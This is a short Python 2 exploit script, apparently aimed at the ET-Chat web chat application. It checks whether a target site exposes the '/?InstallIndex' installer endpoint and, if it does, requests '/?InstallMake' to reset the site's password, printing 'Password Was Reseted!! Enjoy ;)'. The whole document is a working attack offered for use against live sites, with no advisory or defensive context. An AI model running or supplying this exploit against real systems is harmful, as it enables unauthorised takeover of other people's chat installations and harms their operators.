#!/usr/bin/env python
__author__ = 'IRH'
print "Example: et-chat.py http://et-chat.com/chat"

import urllib
import sys

url = sys.argv[1]
url1 = url+"/?InstallIndex"
url2 = url+"/?InstallMake"

checkurl = urllib.urlopen(url1)

if checkurl.code == 200 :
    urllib.urlopen(url2)
    print "Password Was Reseted!! Enjoy ;)"
else:
    print "Site is not Vulnerability"
